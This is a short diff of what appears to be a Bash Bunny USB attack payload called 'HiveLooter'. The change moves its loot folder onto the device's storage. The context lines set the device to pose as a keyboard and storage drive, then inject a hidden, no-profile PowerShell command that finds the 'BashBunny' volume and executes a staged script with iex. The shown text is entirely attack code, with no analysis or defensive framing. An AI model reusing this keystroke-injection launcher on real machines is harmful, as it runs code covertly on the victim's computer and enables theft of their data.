@@ -11,7 +11,7 @@ LED SETUP
 
 ATTACKMODE HID STORAGE
 GET SWITCH_POSITION
-mkdir -p /root/loot/HiveLooter
+mkdir -p /root/udisk/loot/HiveLooter
 
 LED ATTACK
 RUN WIN "powershell -w 1 -NoP iex(gc((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\\$SWITCH_POSITION\p')-Raw)"
